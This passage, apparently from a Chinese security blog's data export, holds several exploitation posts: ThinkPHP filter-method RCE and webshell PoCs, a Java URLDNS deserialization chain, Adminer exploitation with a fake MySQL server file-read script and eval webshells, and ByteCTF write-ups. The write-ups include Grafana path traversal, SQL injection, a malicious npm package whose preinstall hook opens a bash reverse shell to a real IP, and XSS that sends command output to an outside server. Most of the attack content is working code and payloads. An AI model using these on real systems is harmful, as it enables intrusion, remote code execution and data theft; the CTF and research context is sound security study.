alt=\"image-20220425161308944\"></p>\n<p>顺利**进入Request::param()**，往下就流程同未开启debug一样</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/1d436f4e1d56a884c1d2d0d2dfe33d98.png\"></p>\n<h1 id=\"改造\"><a href=\"#改造\" class=\"headerlink\" title=\"改造\"></a>改造</h1><p>如果不能利用 <strong>__construct</strong>方法，也就是不能覆盖 <strong>filter</strong> 参数，而call_user_func中的value可以通过URL传入经过get()从而可控，尝试寻找一种新的方法去控制$filter即可，</p>\n<h1 id=\"开启debug改造\"><a href=\"#开启debug改造\" class=\"headerlink\" title=\"开启debug改造\"></a>开启debug改造</h1><h2 id=\"命令执行\"><a href=\"#命令执行\" class=\"headerlink\" title=\"命令执行\"></a>命令执行</h2><p>给出命令执行的poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST:</span><br><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;public&#x2F;?a&#x3D;whoami</span><br><span class=\"line\">0&#x3D;system&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure>\n\n<p>分析：任意调用方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/41c31480dfe2ad0e661f0bc461228cc1.png\"></p>\n<p>调用filter()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/a739c1cb2f777e09b1a22254ed895d3d.png\" alt=\"image-20220425120242803\"></p>\n<p>由App:run()进入param()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/7f001aa22b9e93261b170196f0fd6d0f.png\" alt=\"image-20220425120411572\"></p>\n<p>进入$this-&gt;filterValue()，但是这里由于没有走到参数合并处，并没有成功rce</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/28db8af6303510f035ce9afd1d4956af.png\" alt=\"image-20220425120542003\"></p>\n<p>走到参数合并</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e79bf5115caa130d66cca23ed44f73a3.png\" alt=\"image-20220425142256613\"></p>\n<p>再次进入input()，调用filterValue</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/3bd1de26c400186e9697457237f4fc5e.png\" alt=\"image-20220425142401614\"></p>\n<p>命令执行</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/3fe2e2a0fb0dcd019197693ce64fb203.png\" alt=\"image-20220425142432637\"></p>\n<p>流程：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6e37a8270b390f28517db82686d2f503.png\" alt=\"image-20220425115902279\"></p>\n<h2 id=\"phpinfo\"><a href=\"#phpinfo\" class=\"headerlink\" title=\"phpinfo\"></a>phpinfo</h2><p>server函数中 将全局变量$_SERVER，赋值给$this-&gt;server ，传入input()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/14db78d17fa7f03a7e6f8e777f3c4461.png\" alt=\"image-20220424230856390\"></p>\n<p>在input()中 $data为传入的$server，这里取获取请求方式，也就是POST</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/6cd1e239a90a2d1323463c2f7ca0bcce.png\" alt=\"image-20220424231116137\"></p>\n<p>在首次进入filterValue时，调用情况是这样的，对于filter是一种循环调用，上次call_user_func的结果作为filter的参数进行调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/56c5caa8adee28ccba53c811571e07f4.png\" alt=\"image-20220424230442301\"></p>\n<p>虽然value不可控，能否尝试利用 <strong>filter对一个不可控的参数进行调用后产生的结果不影响下次filter的调用</strong></p>\n<p>这里说两个函数 error_reporting 和 phpinfo</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">error_reporting(&#39;test&#39;) 返回数字</span><br><span class=\"line\">phpinfo(6789) 正常调用</span><br></pre></td></tr></table></figure>\n\n<p>对于filter的控制我们可以用 <strong>filter($filter = null)</strong> 函数来进行控制</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/61c0efe58b290ce2bc39e0d96dde9106.png\" alt=\"image-20220425103831864\"></p>\n<p>给出poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">0&#x3D;error_reporting&amp;1&#x3D;phpinfo&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure>\n\n<p>任意方法调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/167b8a813e77220a514be2d618fe4e08.png\" alt=\"image-20220425104706349\"></p>\n<p>调用filter，设置$this-&gt;filter</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/016f0fc2dc9f19f38797365cd46862be.png\" alt=\"image-20220425104743332\"></p>\n<p>返回到run()，一路进入到input()</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/e5bfe262ccfb9563cc8564415f9c0580.png\" alt=\"image-20220425104952965\"></p>\n<p>循环调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/935c830a9ba18d1b1b2b11f63349fddf.png\" alt=\"image-20220425105144946\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/15589c227d9965d25f65b6512a6dee05.png\" alt=\"image-20220425105201835\"></p>\n<p>相当于是流程图中的 二 中实现的</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/9a654626606ce4a6f6b4af08e4c0362a.png\" alt=\"image-20220425113254522\"></p>\n<h2 id=\"sesison文件写入\"><a href=\"#sesison文件写入\" class=\"headerlink\" title=\"sesison文件写入\"></a>sesison文件写入</h2><p>poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;public&#x2F;?a&#x3D;PD9waHAgQGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbJ2MnXSkpOyA&#x2F;Pg&#x3D;&#x3D;</span><br><span class=\"line\">0&#x3D;base64_decode&amp;1&#x3D;think\\Session::set&amp;_method&#x3D;filter</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"session文件包含\"><a href=\"#session文件包含\" class=\"headerlink\" title=\"session文件包含\"></a>session文件包含</h2><p>poc</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;public&#x2F;</span><br><span class=\"line\">Cookie: POST&#x3D;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;tmp&#x2F;tmp&#x2F;sess_nccaieuoqs98rdv8r72hstqfh1</span><br><span class=\"line\">0&#x3D;\\think\\Cookie::get&amp;1&#x3D;think\\__include_file&amp;_method&#x3D;filter&amp;c&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>\n\n<p>如果构造的poc为这样，会导致在include时报错退出程序，利用 <strong>\\think\\Cookie::get</strong> 去改变POST的值。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">http:&#x2F;&#x2F;127.0.0.1&#x2F;public&#x2F;?a&#x3D;D:&#x2F;phpstudy_pro&#x2F;Extensions&#x2F;tmp&#x2F;tmp&#x2F;sess_nccaieuoqs98rdv8r72hstqfh1</span><br><span class=\"line\">0&#x3D;think\\__include_file&amp;_method&#x3D;filter&amp;c&#x3D;phpinfo();</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/3d594f911721b296cf70b18ba3dbf3b8.png\" alt=\"image-20220425150705823\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/c856713ede17303b4d29193aeec7646e.png\" alt=\"image-20220425150852481\"></p>\n<h1 id=\"未开启debug改造-失败\"><a href=\"#未开启debug改造-失败\" class=\"headerlink\" title=\"未开启debug改造(失败)\"></a>未开启debug改造(失败)</h1><p>这样的改造，感觉是很难找出的，这里的$this-&gt;method我们指向filter的话，虽然调用了filter函数，但是返回值 $this-&gt;method 不等于get，所以在switch时，$dispatch[‘type’]=module，<strong>无法进入param()函数</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Thinkphp/688758e200e9c84e8989aca2f90b50ad.png\" alt=\"image-20220425164535226\"></p>\n","categories":["ThinkPHP漏洞集合"]},{"title":"URLDNS链","url":"/2023/12/25/URLDNS%E9%93%BE/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>URLDNS链其实就是DNSlog。可以用来判断目标是否出网或者漏洞是否利用成功。感觉就是判断是不是存在反序列化漏洞用的。</p>\n<h1 id=\"前置知识\"><a href=\"#前置知识\" class=\"headerlink\" title=\"前置知识\"></a>前置知识</h1><p>在反序列化中通过 <strong>readObject</strong> 来返回一个对象,如果一个类中重写了<strong>readObject</strong>，里面可能存在潜在危险利用链</p>\n<p>例如在Person.java中重写 <strong>readObject()</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/ef43ba34089b4b41b3e6d3a8e36e3600.png\"></p>\n<a id=\"more\"></a>\n<p>在反序列化时 触发 <strong>readObject</strong> 导致rce</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/8c6cf9f72c1b434e928e66efbfbc06ab.png\"></p>\n<h1 id=\"分析\"><a href=\"#分析\" class=\"headerlink\" title=\"分析\"></a>分析</h1><p>在<strong>HashMaop.java</strong>中看到 readObject 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/2e6b9f2e101e45e59b8479bc5e208cc7.png\"></p>\n<p>往下看到调用hash函数，传入值为key</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/80758207d3e3416fb642dae37da27ffd.png\"></p>\n<p>跟到 HashMap的hash方法，发现调用 <strong>key的hashCode方法</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/45872a7036054deb9f1f43c72e914045.png\"></p>\n<p>在URL.java 中 <strong>存在hashCode方法</strong>，所以<strong>传入的 key为 URL的对象</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/b79a54d26bf64b908e6b726aafc7aabc.png\"></p>\n<p>此处的 handler 是 URLStreamHandler的一个对象，传入的是 this参数，在<strong>构造方法里可控</strong>，所以这里就是DNSlog传入的地方</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/f31c340c67444589be799ac822418ff2.png\"></p>\n<p>继续跟进 handler.hashCode 方法</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/66104539a0ce4d188c6d3b0a21c5d825.png\"></p>\n<p>跟进<strong>getHostAddress</strong>方法，最终调用 InetAddress 类的 getByName()方法发送请求解析域名为ip，DNSLog收到请求</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/792fb84e91a64eae95ef22ff7a3064f4.png\"></p>\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileNotFoundException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Serialize</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//HashMap要求 键值对</span></span><br><span class=\"line\">        HashMap&lt;URL,Integer&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;URL,Integer&gt;();</span><br><span class=\"line\">        URL url = <span class=\"keyword\">new</span> URL(<span class=\"string\">&quot;http://clrdzx.dnslog.cn&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//设置键值对</span></span><br><span class=\"line\">        hashmap.put(url,<span class=\"number\">1</span>);</span><br><span class=\"line\">        serialize(hashmap);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>测试时出现问题，在序列化时发起了请求，反序列化时没有请求</p>\n<p>具体原因在这里</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">hashmap.put(url,1);</span><br></pre></td></tr></table></figure>\n\n<p>跟进put</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/d5bb1ce26f5e4bd8abd639b97c376e2b.png\"></p>\n<p>为了保持键的唯一性，<strong>本应该在readObject 中调用的hash方法却提前调用hash方法</strong>，接着走到URL的hashCode中</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/89b27f41583241ddadaa706f92e5724b.png\"></p>\n<p><strong>hashCode初始值为 -1 所以在序列化时这里的hashCode已经改变，那么在反序列化时因为hashCode不为-1，导致直接return，不再进行</strong></p>\n<h1 id=\"解决\"><a href=\"#解决\" class=\"headerlink\" title=\"解决\"></a>解决</h1><p><strong>通过反射改变已有对象的属性</strong></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileNotFoundException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.FileOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.net.URL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Serialize</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        HashMap&lt;URL,Integer&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;URL,Integer&gt;();</span><br><span class=\"line\">        URL url = <span class=\"keyword\">new</span> URL(<span class=\"string\">&quot;http://zl0zcu.dnslog.cn&quot;</span>);  <span class=\"comment\">//构造方法传入u</span></span><br><span class=\"line\">        <span class=\"comment\">//hashcode先变为不是-1</span></span><br><span class=\"line\">        Class c = url.getClass();</span><br><span class=\"line\">        Field hashCodeField = c.getDeclaredField(<span class=\"string\">&quot;hashCode&quot;</span>);</span><br><span class=\"line\">        hashCodeField.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        hashCodeField.set(url,<span class=\"number\">123</span>);</span><br><span class=\"line\">        <span class=\"comment\">//添加key</span></span><br><span class=\"line\">        hashmap.put(url,<span class=\"number\">1</span>);</span><br><span class=\"line\">        <span class=\"comment\">//hashcode再变为-1</span></span><br><span class=\"line\">        hashCodeField.set(url,-<span class=\"number\">1</span>);</span><br><span class=\"line\">        serialize(hashmap);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">//HashMap map = new HashMap();</span></span><br><span class=\"line\">        <span class=\"comment\">//URL url = new URL(&quot;http://cbqv10.dnslog.cn&quot;);</span></span><br><span class=\"line\">        <span class=\"comment\">//Field f = Class.forName(&quot;java.net.URL&quot;).getDeclaredField(&quot;hashCode&quot;);</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>成功解决</p>\n","categories":["Java反序列化"]},{"title":"记adminer.php一次利用","url":"/2024/03/27/adminer/","content":"<p>记一次adminer利用</p>\n<p>版本：3.7.0</p>\n<a id=\"more\"></a>\n\n<h1 id=\"任意文件读取\"><a href=\"#任意文件读取\" class=\"headerlink\" title=\"任意文件读取\"></a>任意文件读取</h1><p>伪造fake mysql server任意文件读取</p>\n<p>poc：python2 poc.py /var/www/index.php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#coding&#x3D;utf-8</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import logging</span><br><span class=\"line\">import sys</span><br><span class=\"line\">logging.basicConfig(level&#x3D;logging.DEBUG)</span><br><span class=\"line\"></span><br><span class=\"line\">filename&#x3D;sys.argv[1]</span><br><span class=\"line\">sv&#x3D;socket.socket()</span><br><span class=\"line\">sv.setsockopt(1,2,1)</span><br><span class=\"line\">sv.bind((&quot;&quot;,3308))</span><br><span class=\"line\">sv.listen(5)</span><br><span class=\"line\">conn,address&#x3D;sv.accept()</span><br><span class=\"line\">logging.info(&#39;Conn from: %r&#39;, address)</span><br><span class=\"line\">conn.sendall(&quot;\\x4a\\x00\\x00\\x00\\x0a\\x35\\x2e\\x35\\x2e\\x35\\x33\\x00\\x17\\x00\\x00\\x00\\x6e\\x7a\\x3b\\x54\\x76\\x73\\x61\\x6a\\x00\\xff\\xf7\\x21\\x02\\x00\\x0f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x70\\x76\\x21\\x3d\\x50\\x5c\\x5a\\x32\\x2a\\x7a\\x49\\x3f\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&quot;)conn.recv(9999)</span><br><span class=\"line\">logging.info(&quot;auth okay&quot;)</span><br><span class=\"line\">conn.sendall(&quot;\\x07\\x00\\x00\\x02\\x00\\x00\\x00\\x02\\x00\\x00\\x00&quot;)</span><br><span class=\"line\">conn.recv(9999)</span><br><span class=\"line\">logging.info(&quot;want file...&quot;)</span><br><span class=\"line\">wantfile&#x3D;chr(len(filename)+1)+&quot;\\x00\\x00\\x01\\xFB&quot;+filename</span><br><span class=\"line\">conn.sendall(wantfile)</span><br><span class=\"line\">content&#x3D;conn.recv(20000)</span><br><span class=\"line\">logging.info(content)</span><br><span class=\"line\">conn.close()</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest/image-20240321054936734.png\" alt=\"image-20240321054936734\"></p>\n<h1 id=\"mysql日志写shell\"><a href=\"#mysql日志写shell\" class=\"headerlink\" title=\"mysql日志写shell\"></a>mysql日志写shell</h1><p>正常的开启日志写shell，需要一定权限</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">set global general_log&#x3D;on;</span><br><span class=\"line\">set global general_log_file&#x3D;&#39;&#x2F;var&#x2F;www&#x2F;shell.php&#39;;</span><br><span class=\"line\">select &#39;&lt;?php eval($_POST[&#39;pwd&#39;]);?&gt;&#39;;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"sqlite3写shell\"><a href=\"#sqlite3写shell\" class=\"headerlink\" title=\"sqlite3写shell\"></a>sqlite3写shell</h1><p>遇到了这种极端情况，权限低可以尝试sqlite3，条件需要有sqlite的驱动</p>\n<p>直接点登录</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest/image-20240321055259630.png\" alt=\"image-20240321055259630\"></p>\n<p>使用命令，创建php，路径随意</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ATTACH DATABASE &#39;c.php&#39; AS lol;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest/image-20240321055535881.png\" alt=\"image-20240321055535881\"></p>\n<p>使用c.php</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest/image-20240321055601476.png\" alt=\"image-20240321055601476\"></p>\n<p>创建新表，插入payload，保存</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest/image-20240321055645049.png\" alt=\"image-20240321055645049\"></p>\n<p>shell</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/pentest/image-20240321055758824.png\" alt=\"image-20240321055758824\"></p>\n","categories":["渗透"]},{"title":"2021 ByteCTF-2022 web","url":"/2023/12/25/byte/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927171917880.png\" alt=\"image-20220927171917880\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"easy-grafana\"><a href=\"#easy-grafana\" class=\"headerlink\" title=\"easy_grafana\"></a>easy_grafana</h1><p>历史CVE</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#x2F;public&#x2F;plugins&#x2F;text&#x2F;#&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br><span class=\"line\">&#x2F;public&#x2F;plugins&#x2F;text&#x2F;#&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;grafana&#x2F;grafana.ini</span><br><span class=\"line\">&#x2F;public&#x2F;plugins&#x2F;text&#x2F;#&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;grafana&#x2F;grafana.db</span><br></pre></td></tr></table></figure>\n\n<p>下载db文件后利用：<a href=\"https://github.com/A-D-Team/grafanaExp\">A-D-Team/grafanaExp</a>，解密db文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925221845070.png\" alt=\"image-20220925221845070\"></p>\n<p>FLAG：ByteCTF{e292f461-285e-47fc-9210-b9cd233773cb}</p>\n<h1 id=\"ctf-cloud\"><a href=\"#ctf-cloud\" class=\"headerlink\" title=\"ctf_cloud\"></a>ctf_cloud</h1><p>注册功能存在sql注入可修改admin密码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162016193.png\" alt=\"image-20220924162016193\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;username&quot;:&quot;c&quot;,&quot;password&quot;:&quot;1&#39;,0),(&#39;admin&#39;,&#39;a&#39;,1)--&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>upload功能不允许目录穿越，文件名与内容可任意写</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162206065.png\" alt=\"image-20220924162206065\"></p>\n<p>编译功能允许写入package.json中的 dependencies</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162357119.png\" alt=\"image-20220924162357119\"></p>\n<p>run功能去利用npm安装</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924162042567.png\" alt=\"image-20220924162042567\"></p>\n<p>也就是我们可以利用dependencies功能去可控package.json中的npm包。制作一个恶意的npm包发布然后修改package.json，<a href=\"https://juejin.cn/post/6987695534504935438\">创建并发布一个npm 包</a></p>\n<p>构造恶意package.json利用 <strong>preinstall</strong> 执行命令</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;name&quot;: &quot;y0ngtest&quot;,</span><br><span class=\"line\">  &quot;version&quot;: &quot;1.0.8&quot;,</span><br><span class=\"line\">  &quot;description&quot;: &quot;test for shell&quot;,</span><br><span class=\"line\">  &quot;main&quot;: &quot;app.js&quot;,</span><br><span class=\"line\">  &quot;scripts&quot;: &#123;</span><br><span class=\"line\">    &quot;preinstall&quot;: &quot;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;124.222.115.141&#x2F;9000 0&gt;&amp;1&#39;&quot;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  &quot;author&quot;: &quot;&quot;,</span><br><span class=\"line\">  &quot;license&quot;: &quot;ISC&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>push</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925195249316.png\" alt=\"image-20220925195249316\"></p>\n<p>写入恶意包，run功能触发npm安装</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924181437087.png\" alt=\"image-20220924181437087\"></p>\n<p>测试收到/etc/passwd成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220924181223543.png\" alt=\"image-20220924181223543\"></p>\n<p>shell：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220925224008708.png\" alt=\"image-20220925224008708\"></p>\n<p>删除恶意包</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm unpublish y0ngtest --force</span><br></pre></td></tr></table></figure>\n\n<p>FLAG：ByteCTF{c98ecaae-4e6e-43da-a084-1f0d99034420}</p>\n<h1 id=\"typing-game\"><a href=\"#typing-game\" class=\"headerlink\" title=\"typing_game\"></a>typing_game</h1><p>附件/status下可以4字符的命令执行，有ip检测。/report访问任意html可打xss</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927154934708.png\" alt=\"image-20220927154934708\"></p>\n<p>在玩完游戏后name存在xss</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927163408414.png\" alt=\"image-20220927163408414\"></p>\n<p>这题关键就是怎么利用xss从words中将word填入到框框里，利用iframe.contentWindow.location.replace不断刷新 hash</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/byte-CTF/image-20220927163546869.png\" alt=\"image-20220927163546869\"></p>\n<p>抄个exp</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE html&gt;</span><br><span class=\"line\">&lt;head&gt;</span><br><span class=\"line\">&lt;&#x2F;head&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    &lt;iframe width&#x3D;&quot;100%&quot; height&#x3D;&quot;500px&quot; id&#x3D;&quot;iframe&quot; src&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:13002&#x2F;&quot;&gt;&lt;&#x2F;iframe&gt;</span><br><span class=\"line\">    &lt;script&gt;</span><br><span class=\"line\">        cmd &#x3D; &quot;env&quot;</span><br><span class=\"line\">        cmd &#x3D; &#96;fetch(&quot;http:&#x2F;&#x2F;127.0.0.1:13002&#x2F;status?cmd&#x3D;$&#123;cmd&#125;&quot;).then(x&#x3D;&gt;x.text()).then(x&#x3D;&gt;fetch(&quot;http:&#x2F;&#x2F;your-server?data&#x3D;&quot;+x))&#96;</span><br><span class=\"line\">        cmd 